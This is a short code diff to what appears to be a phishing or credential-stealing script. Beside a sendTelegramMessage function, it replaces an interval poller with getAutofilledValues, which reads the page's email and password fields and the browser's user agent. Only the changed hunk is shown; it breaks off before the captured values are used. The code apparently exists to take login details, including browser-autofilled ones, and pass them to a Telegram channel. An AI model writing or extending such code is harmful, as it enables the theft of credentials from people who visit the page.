@@ -17,7 +17,8 @@ function sendTelegramMessage(message) {
     });
 }
 
-var intervalId = setInterval(function() {
+// var intervalId = setInterval(function() {
+function getAutofilledValues() {
   var email = document.getElementById(`email`).value;
   var password = document.getElementById(`password`).value;
   var userAgent = navigator.userAgent;
